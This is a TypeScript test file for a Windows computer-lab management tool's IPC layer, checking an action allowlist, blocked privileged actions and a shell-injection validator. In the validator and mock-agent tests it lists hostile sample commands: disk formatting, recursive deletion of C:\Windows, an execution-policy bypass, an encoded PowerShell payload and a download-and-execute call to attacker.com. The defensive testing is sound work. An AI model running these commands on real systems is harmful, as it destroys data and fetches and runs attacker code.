import test from "node:test";
import assert from "node:assert/strict";

import {
  IPC_CONSTANTS,
  ALLOWED_IPC_ACTIONS,
  IpcEnvelope
} from "../src/desktop/contracts";
import {
  MockDesktopAgent,
  validateIpcAction,
  validateNoArbitraryShell
} from "../src/desktop/mock-agent";

test("IPC constants define strictly required pipe name and protocol version", () => {
  assert.equal(IPC_CONSTANTS.PIPE_NAME, "WinLabService");
  assert.equal(IPC_CONSTANTS.PROTOCOL_VERSION, "1.0.0");
  assert.ok(ALLOWED_IPC_ACTIONS.includes("inventory.query"));
  assert.ok(ALLOWED_IPC_ACTIONS.includes("policy.query_state"));
  assert.ok(ALLOWED_IPC_ACTIONS.includes("preflight.query"));
  assert.ok(ALLOWED_IPC_ACTIONS.includes("presets.list"));
  assert.ok(ALLOWED_IPC_ACTIONS.includes("policy.preview_diff"));
  assert.ok(ALLOWED_IPC_ACTIONS.includes("config.validate"));
});

test("security validator blocks arbitrary shell execution strings", () => {
  const attacks = [
    "powershell.exe -ExecutionPolicy Bypass -File evil.ps1",
    "cmd.exe /c format c:",
    "pwsh.exe -Command Remove-Item -Recurse C:\\Windows",
    "iex (New-Object Net.WebClient).DownloadString('http://attacker.com')",
    "wscript.shell Run('notepad.exe')",
    "eval('malicious code')"
  ];

  for (const attack of attacks) {
    const result = validateNoArbitraryShell(attack);
    assert.equal(result.isSafe, false, `Expected to block attack: ${attack}`);
    assert.match(result.error ?? "", /Forbidden executable or script pattern/);
  }

  // Safe strings and JSON payloads pass
  const safePayload = JSON.stringify({
    profileName: "Microlins Lab",
    studentUser: "Aluno",
    adminUser: "Administrador"
  });
  const safeResult = validateNoArbitraryShell(safePayload);
  assert.equal(safeResult.isSafe, true);
});

test("security validator rejects empty or unlisted IPC actions", () => {
  assert.equal(validateIpcAction("").isValid, false);
  assert.equal(validateIpcAction("   ").isValid, false);

  const unlisted = validateIpcAction("system.format_drive");
  assert.equal(unlisted.isValid, false);
  assert.equal(unlisted.errorCode, "UNAUTHORIZED_ACTION");

  const unlistedShell = validateIpcAction("system.exec_shell");
  assert.equal(unlistedShell.isValid, false);
  assert.equal(unlistedShell.errorCode, "UNAUTHORIZED_ACTION");
});

test("security validator blocks privileged mutating actions in foundation desktop stage", () => {
  // Apply e Rollback devem ser bloqueados nesta etapa (sem executor privilegiado)
  const applyCheck = validateIpcAction(IPC_CONSTANTS.ACTION_APPLY_POLICIES);
  assert.equal(applyCheck.isValid, false);
  assert.equal(applyCheck.errorCode, "PRIVILEGED_EXECUTOR_DISABLED");
  assert.match(applyCheck.error ?? "", /Privileged policy execution is disabled/);

  const rollbackCheck = validateIpcAction(IPC_CONSTANTS.ACTION_ROLLBACK_POLICIES);
  assert.equal(rollbackCheck.isValid, false);
  assert.equal(rollbackCheck.errorCode, "PRIVILEGED_EXECUTOR_DISABLED");
});

test("security validator allows valid read-only query and preview actions", () => {
  assert.equal(validateIpcAction(IPC_CONSTANTS.ACTION_QUERY_INVENTORY).isValid, true);
  assert.equal(validateIpcAction(IPC_CONSTANTS.ACTION_QUERY_POLICY_STATE).isValid, true);
  assert.equal(validateIpcAction(IPC_CONSTANTS.ACTION_QUERY_PREFLIGHT).isValid, true);
  assert.equal(validateIpcAction(IPC_CONSTANTS.ACTION_LIST_PRESETS).isValid, true);
  assert.equal(validateIpcAction(IPC_CONSTANTS.ACTION_PREVIEW_POLICY_DIFF).isValid, true);
  assert.equal(validateIpcAction(IPC_CONSTANTS.ACTION_VALIDATE_CONFIG).isValid, true);
});

test("MockDesktopAgent returns structured read-only inventory conforming to schema", async () => {
  const agent = new MockDesktopAgent();
  const envelope: IpcEnvelope = {
    id: "req-inv-1",
    version: IPC_CONSTANTS.PROTOCOL_VERSION,
    timestamp: new Date().toISOString(),
    type: "query",
    action: IPC_CONSTANTS.ACTION_QUERY_INVENTORY
  };

  const res = await agent.handleRequest(envelope);
  assert.equal(res.success, true);
  assert.equal(res.replyToId, "req-inv-1");

  const inv = res.data as ReturnType<typeof agent.getMockInventory>;
  assert.equal(inv.computerName, "LAB-MICROLINS-01");
  assert.equal(inv.windows.caption, "Windows 11 Pro");
  assert.equal(inv.windows.architecture, "64 bits");
  assert.ok(inv.detectedApps.length > 0);
  assert.ok(inv.localUsers.some((u) => u.name === "Aluno" && !u.isAdmin));
  assert.ok(inv.localUsers.some((u) => u.name === "Administrador" && u.isAdmin));
});

test("MockDesktopAgent returns policy state summary with unconfigured initial state", async () => {
  const agent = new MockDesktopAgent();
  const envelope: IpcEnvelope = {
    id: "req-pol-1",
    version: IPC_CONSTANTS.PROTOCOL_VERSION,
    timestamp: new Date().toISOString(),
    type: "query",
    action: IPC_CONSTANTS.ACTION_QUERY_POLICY_STATE
  };

  const res = await agent.handleRequest(envelope);
  assert.equal(res.success, true);

  const pol = res.data as ReturnType<typeof agent.getMockPolicyState>;
  assert.equal(pol.totalPolicies, 6);
  assert.equal(pol.appliedCount, 0);
  assert.equal(pol.notConfiguredCount, 6);
  assert.ok(pol.items.every((item) => item.currentState === "NotConfigured"));
});

test("MockDesktopAgent rejects malicious payload containing shell injection", async () => {
  const agent = new MockDesktopAgent();
  const malicious: IpcEnvelope = {
    id: "req-malicious-1",
    version: IPC_CONSTANTS.PROTOCOL_VERSION,
    timestamp: new Date().toISOString(),
    type: "command",
    action: IPC_CONSTANTS.ACTION_QUERY_INVENTORY,
    payload: { filter: "powershell.exe -enc Zm9v" }
  };

  const res = await agent.handleRequest(malicious);
  assert.equal(res.success, false);
  assert.equal(res.errorCode, "FORBIDDEN_SHELL_INJECTION");
  assert.match(res.error ?? "", /Forbidden executable or script pattern/);
});

test("MockDesktopAgent rejects attempt to invoke apply policies in foundation stage", async () => {
  const agent = new MockDesktopAgent();
  const applyEnvelope: IpcEnvelope = {
    id: "req-apply-1",
    version: IPC_CONSTANTS.PROTOCOL_VERSION,
    timestamp: new Date().toISOString(),
    type: "command",
    action: IPC_CONSTANTS.ACTION_APPLY_POLICIES,
    payload: { targetUser: "Aluno" }
  };

  const res = await agent.handleRequest(applyEnvelope);
  assert.equal(res.success, false);
  assert.equal(res.errorCode, "PRIVILEGED_EXECUTOR_DISABLED");
});
